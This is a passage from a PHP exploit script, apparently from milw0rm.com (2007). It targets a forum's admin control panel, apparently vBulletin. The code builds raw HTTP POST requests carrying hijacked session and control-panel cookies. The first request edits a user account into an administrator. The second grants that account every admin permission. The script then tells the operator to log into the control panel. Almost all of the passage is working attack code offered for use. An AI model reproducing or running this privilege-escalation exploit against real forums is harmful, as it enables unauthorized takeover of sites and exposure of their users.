$data.=&quot;&amp;adminoptions%5Badminavatar%5D=0&quot;;
$data.=&quot;&amp;adminoptions%5Badminprofilepic%5D=0&quot;;
$data.=&quot;&amp;user%5Btimezoneoffset%5D=0&quot;;
$data.=&quot;&amp;options%5Bdstauto%5D=1&quot;;
$data.=&quot;&amp;options%5Bdstonoff%5D=0&quot;;
$data.=&quot;&amp;user%5Bdaysprune%5D=-1&quot;;
$data.=&quot;&amp;user%5Bjoindate%5D%5Bmonth%5D=2&quot;;
$data.=&quot;&amp;user%5Bjoindate%5D%5Bday%5D=26&quot;;
$data.=&quot;&amp;user%5Bjoindate%5D%5Byear%5D=2007&quot;;
$data.=&quot;&amp;user%5Bjoindate%5D%5Bhour%5D=14&quot;;
$data.=&quot;&amp;user%5Bjoindate%5D%5Bminute%5D=39&quot;;
$data.=&quot;&amp;user%5Blastactivity%5D%5Bmonth%5D=2&quot;;
$data.=&quot;&amp;user%5Blastactivity%5D%5Bday%5D=26&quot;;
$data.=&quot;&amp;user%5Blastactivity%5D%5Byear%5D=2007&quot;;
$data.=&quot;&amp;user%5Blastactivity%5D%5Bhour%5D=14&quot;;
$data.=&quot;&amp;user%5Blastactivity%5D%5Bminute%5D=58&quot;;
$data.=&quot;&amp;user%5Blastpost%5D%5Bmonth%5D=0&quot;;
$data.=&quot;&amp;user%5Blastpost%5D%5Bday%5D=&quot;;
$data.=&quot;&amp;user%5Blastpost%5D%5Byear%5D=&quot;;
$data.=&quot;&amp;user%5Blastpost%5D%5Bhour%5D=&quot;;
$data.=&quot;&amp;user%5Blastpost%5D%5Bminute%5D=&quot;;
$data.=&quot;&amp;userid=&quot;.$mu_uid;
$data.=&quot;&amp;ousergroupid=&quot;;
$data.=&quot;&amp;odisplaygroupid=0&quot;;
$data.=&quot;&amp;userfield%5Bfield1_set%5D=1&quot;;
$data.=&quot;&amp;userfield%5Bfield2_set%5D=1&quot;;
$data.=&quot;&amp;userfield%5Bfield3_set%5D=1&quot;;
$data.=&quot;&amp;userfield%5Bfield4_set%5D=1&quot;;
$packet =&quot;POST &quot;.$p.&quot;admincp/user.php?do=edit&amp;u=$my_uid HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
$packet.=&quot;Accept-Language: en\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Pragma: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie_prefix.&quot;lastactivity=0; &quot;.$cookie_prefix.&quot;password=&quot;.md5(trim($my_hash)).&quot;; &quot;.$cookie_prefix.&quot;userid=&quot;.$uid.&quot;; &quot;.$cookie_prefix.&quot;sessionhash=&quot;.trim($sess_hash).&quot;; &quot;.$cookie_prefix.&quot;cpsession=&quot;.trim($cpsess_hash).&quot;;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
sleep(1);

//now give full rights to the new Administrator
$data =&quot;do=update&quot;;
$data.=&quot;&amp;adminhash=&quot;.$adminhash;
$data.=&quot;&amp;adminpermissions%5Bcanadminsettings%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminstyles%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminlanguages%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminforums%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminthreads%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadmincalendars%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminusers%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminpermissions%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminfaq%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminimages%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminbbcodes%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadmincron%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminmaintain%5D=1&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminplugins%5D=1&quot;;
$data.=&quot;&amp;cssprefs=&quot;;
$data.=&quot;&amp;dismissednews=&quot;;
$data.=&quot;&amp;userid=&quot;.$my_uid;
$data.=&quot;&amp;oldpermissions=98300&quot;;
$data.=&quot;&amp;adminpermissions%5Bcanadminupgrade%5D=0&quot;;
$packet =&quot;POST &quot;.$p.&quot;admincp/adminpermissions.php?do=update HTTP/1.0\r\n&quot;;
$packet.=&quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;profile.php\r\n&quot;;
$packet.=&quot;Accept-Language: en\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Pragma: no-cache\r\n&quot;;
$packet.=&quot;Cookie: &quot;.$cookie_prefix.&quot;lastactivity=0; &quot;.$cookie_prefix.&quot;password=&quot;.md5(trim($my_hash)).&quot;; &quot;.$cookie_prefix.&quot;userid=&quot;.$uid.&quot;; &quot;.$cookie_prefix.&quot;sessionhash=&quot;.trim($sess_hash).&quot;; &quot;.$cookie_prefix.&quot;cpsession=&quot;.trim($cpsess_hash).&quot;;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
echo &quot;\nnow go to http://&quot;.$host.$path.&quot;admincp/index.php and login to the control panel...&quot;;
?&gt;

# milw0rm.com [2007-02-28]</pre></html>